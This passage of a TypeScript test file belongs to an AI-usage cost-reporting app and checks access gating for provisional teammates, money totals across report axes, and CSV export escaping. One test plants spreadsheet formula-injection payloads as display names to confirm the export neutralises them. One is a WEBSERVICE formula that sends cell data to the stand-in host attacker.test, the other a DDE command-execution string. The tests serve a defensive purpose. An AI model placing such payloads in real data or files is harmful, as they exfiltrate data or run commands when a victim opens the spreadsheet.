        activity_tagged_usd: string
        untaggable_usd: string
      }
      const tokensheet = body.tokensheet as { contribution_usd: string }[]
      const tagged = tokensheet.reduce((a, r) => a + Number(r.contribution_usd), 0)
      const noProject =
        Number(w.untagged_usd) + Number(w.activity_tagged_usd) + Number(w.untaggable_usd)
      expect(tagged + noProject).toBeCloseTo(body.headlineUsd as number, 6)
    } finally {
      await clearNoProjectStates()
    }
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// r3-H2 — the export is gated and escaped exactly like the page
// ─────────────────────────────────────────────────────────────────────────────

describe('r3-H2 / r3-M2 — the CSV is a dataset, not a script', () => {
  it('a PROVISIONAL subject gets no file, in the same 403 the page speaks', async () => {
    await t.client`INSERT INTO teammate (entra_oid, email, display_name, region_id, org_unit_id, is_active, provisional)
      VALUES ('provisional:drill-shadow', 'claimed@ko.test', 'Claimed', ${ids.regionApac}::uuid,
              ${ids.uApacCto}::uuid, true, true)`
    const [s] = await t.client<{ id: string }[]>`
      SELECT id::text AS id FROM teammate WHERE entra_oid='provisional:drill-shadow'`
    const [inst] = await t.client<{ id: string }[]>`
      SELECT instance_id::text AS id FROM instance_attestation WHERE teammate_id=${ids.alice}::uuid LIMIT 1`
    await t.client`INSERT INTO attribution_record
        (instance_id, teammate_id, region_id, org_unit_id, cost_owning_unit_id, project_id,
         tool, model, token_type, tokens, cost_usd, fidelity_tier, cost_basis, ts_event,
         claude_session_id, identity_state)
      VALUES (${inst!.id}::uuid, ${s!.id}::uuid, ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid,
              ${ids.uApacCto}::uuid, ${ids.projScholarship}::uuid, 'claude-code',
              'claude-sonnet-4-6', 'input', 1000, 42, 'tier-1', 'estimated',
              '2026-05-09T00:00:00Z'::timestamptz, 'r3h2-shadow', 'provisional')`
    try {
      await expectForbidden(
        teammateReport(ev(adminSess(), `src=across&${MONTH}`, { id: s!.id }).event),
      )
      await expectForbidden(
        teammateExport(ev(adminSess(), `src=across&${MONTH}`, { id: s!.id }).event),
      )
    } finally {
      await t.client`DELETE FROM attribution_record WHERE claude_session_id = 'r3h2-shadow'`
      await t.client`DELETE FROM teammate WHERE id = ${s!.id}::uuid`
    }
  })

  it('formula-bearing NAMES are exported as literals — in the stamp and in the rows', async () => {
    /*
     * BOTH textual cells the file carries from user-controlled text: the
     * directory display name (the `# teammate` stamp) and the project display
     * name (a data row). Either is enough to make a spreadsheet call out to a
     * host of the author's choosing the moment the file is opened.
     */
    const evilProject = '=WEBSERVICE("https://attacker.test/?v="&ENCODEURL(B1))'
    const evilPerson = '@SUM(1+9)*cmd|\' /C calc\'!A0'
    await t.client`UPDATE project SET display_name = ${evilProject} WHERE id = ${ids.projScholarship}::uuid`
    await t.client`UPDATE teammate SET display_name = ${evilPerson} WHERE id = ${ids.alice}::uuid`
    try {
      const { event } = ev(ownerSess(), `src=cc:${ids.uApacCto}&${MONTH}`, { id: ids.alice })
      const csv = (await teammateExport(event)) as unknown as string
      // Neutralised with the leading apostrophe the central helper applies…
      expect(csv).toContain('"\'=WEBSERVICE')
      expect(csv).toContain("'@SUM(1+9)")
      // …and no cell begins a formula, on any line, anywhere in the file.
      for (const line of csv.split('\n')) {
        for (const cell of line.split(',')) {
          expect(/^[=+@\t\r]/.test(cell)).toBe(false)
        }
      }
      // The row is still READABLE — escaping is not redaction.
      expect(csv).toContain('PROJ-SCHOLARSHIP')
    } finally {
      await t.client`UPDATE project SET display_name = 'Scholarship' WHERE id = ${ids.projScholarship}::uuid`
      await t.client`UPDATE teammate SET display_name = NULL WHERE id = ${ids.alice}::uuid`
    }
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// r4-H2 — a provisional subject on a DRIVER axis: money kept, door closed
// ─────────────────────────────────────────────────────────────────────────────

/*
 * `teammateDrillAdmission` refuses a provisional shadow (r3-H2), so the endpoint
 * 403s — but the ranked teammate axes carried only `teammate_active`, and the
 * client's default for the provisional conjunct is `false`. Every shadow row
 * therefore rendered as a live-looking link onto a guaranteed 403: exactly the
 * dead button `drill-contract.ts` exists to forbid.
 *
 * THE FIX CARRIES THE FACT; IT DOES NOT DROP THE ROW. These axes are
 * DECOMPOSITIONS — `headlineUsd` is Σ of the rows they return — so filtering the
 * subject out would trade a dead link for a §A total that disagrees with every
 * other figure on the same page. Both halves are asserted below, on both
 * producers (`engine/drivers.ts` and `reporting/cost-centres.ts`), because a fix
 * to one and not the other is the drift that put two copies of this axis in the
 * codebase in the first place.
 *
 * MUTATION A: drop `teammate_provisional` from either producer's `dims` and the
 *   drill-contract assertion goes red (the row becomes a link).
 * MUTATION B: exclude provisional rows from either query instead and the
 *   money-conservation assertion goes red (Σ rows ≠ headline ≠ the scope total).
 */
describe('r4-H2 — the ranked teammate axes carry the provisional conjunct', () => {
  const GRANTED: DrillGrants = { teammate: 'people-scope', project: 'member-in-scope' }
  const SHADOW_USD = 42
  /** The whole-company §A May total in the known-outcome fixture. */
  const KO_MAY_TOTAL = 915
  let shadow = ''

  const drillDecision = (row: DriverRow, src: string) =>
    teammateDrillTarget(
      GRANTED,
      {
        id: row.key,
        isActive: row.dims?.teammate_active === 'true',
        isProvisional: row.dims?.teammate_provisional === 'true',
      },
      { src, month: '2026-05' },
    )

  beforeAll(async () => {
    await t.client`INSERT INTO teammate (entra_oid, email, display_name, region_id, org_unit_id, is_active, provisional)
      VALUES ('provisional:driver-shadow', 'claimed-driver@ko.test', 'Claimed Driver',
              ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid, true, true)`
    const [s] = await t.client<{ id: string }[]>`
      SELECT id::text AS id FROM teammate WHERE entra_oid='provisional:driver-shadow'`
    shadow = s!.id
    const [inst] = await t.client<{ id: string }[]>`
      SELECT instance_id::text AS id FROM instance_attestation WHERE teammate_id=${ids.alice}::uuid LIMIT 1`
    // Homed to apac.cto and tagged to a project there, so the shadow lands on
    // BOTH axes: the whole-company one and the cost centre's own burn drill.
    await t.client`INSERT INTO attribution_record
        (instance_id, teammate_id, region_id, org_unit_id, cost_owning_unit_id, project_id,
         tool, model, token_type, tokens, cost_usd, fidelity_tier, cost_basis, ts_event,
         claude_session_id, identity_state)
      VALUES (${inst!.id}::uuid, ${shadow}::uuid, ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid,
              ${ids.uApacCto}::uuid, ${ids.projScholarship}::uuid, 'claude-code',
              'claude-sonnet-4-6', 'input', 1000, ${SHADOW_USD}, 'tier-1', 'estimated',
              '2026-05-09T00:00:00Z'::timestamptz, 'r4h2-driver-shadow', 'provisional')`
    // New §A row on an already-materialised day — REBUILD the rollup the
    // teammate axis reads (usage-rollup-lane.md R5/R8).
    await rebuildUsageRollup(t.db)
    resetReportCache()
  }, 60_000)

  afterAll(async () => {
    await t.client`DELETE FROM attribution_record WHERE claude_session_id = 'r4h2-driver-shadow'`
    // Restore the rollup BEFORE deleting the teammate: usage_rollup_daily FKs
    // teammate(id), so the shadow's rollup rows must vanish (their lane rows
    // just did) for the row delete to pass.
    await rebuildUsageRollup(t.db)
    await t.client`DELETE FROM teammate WHERE id = ${shadow}::uuid`
    resetReportCache()
  }, 60_000)

  it('whole-company axis: the shadow keeps its dollars and loses its link', async () => {
    const { event } = ev(adminSess(), `region=all&${MONTH}&axis=teammate`, {})
    const body = (await regionDrivers(event as unknown as Parameters<typeof regionDrivers>[0])) as
      unknown as { headlineUsd: number; rows: DriverRow[] }

    // MONEY: the row is in the axis, the axis foots to its own headline, and the
    // headline is the scope's §A total — not a quietly smaller one.
    const row = body.rows.find((r) => r.key === shadow)!
    expect(row, 'the provisional subject must still be a row').toBeDefined()
    expect(row.usd).toBeCloseTo(SHADOW_USD, 6)
    expect(body.rows.reduce((a, r) => a + r.usd, 0)).toBeCloseTo(body.headlineUsd, 6)
    expect(body.headlineUsd).toBeCloseTo(KO_MAY_TOTAL + SHADOW_USD, 6)

    // THE DOOR: the fact rides the row, and the contract renders plain text.
    expect(row.dims?.teammate_provisional).toBe('true')
    expect(drillDecision(row, 'across')).toBeNull()

    // …and a CONFIRMED subject on the same axis is still a live link, so the
    // assertion above is the conjunct doing its job, not a disabled surface.
    const alice = body.rows.find((r) => r.key === ids.alice)!
    expect(alice.dims?.teammate_provisional).toBe('false')
    expect(drillDecision(alice, 'across')).toMatchObject({ kind: 'link' })
  })

  it('cost-centre burn drill: the same two answers, from the other producer', async () => {
    const { event } = ev(ownerSess(), `${MONTH}&axis=teammate`, { ccId: ids.uApacCto })
    const body = (await ccDrill(event as unknown as Parameters<typeof ccDrill>[0])) as unknown as {
      burnUsd: number
      headlineUsd: number
      rows: DriverRow[]
    }
    const row = body.rows.find((r) => r.key === shadow)!
    expect(row).toBeDefined()
    expect(row.usd).toBeCloseTo(SHADOW_USD, 6)
    // apac.cto's May burn was 100 (known-outcome-validation.test.ts:207-220).
    expect(body.headlineUsd).toBeCloseTo(100 + SHADOW_USD, 6)
    expect(body.rows.reduce((a, r) => a + r.usd, 0)).toBeCloseTo(body.headlineUsd, 6)

    expect(row.dims?.teammate_provisional).toBe('true')
    expect(drillDecision(row, `cc:${ids.uApacCto}`)).toBeNull()
  })

  it('the closed door is the TRUTH: the destination really does 403', async () => {
    await expectForbidden(
      teammateReport(ev(adminSess(), `src=across&${MONTH}`, { id: shadow }).event),
    )
  })
})
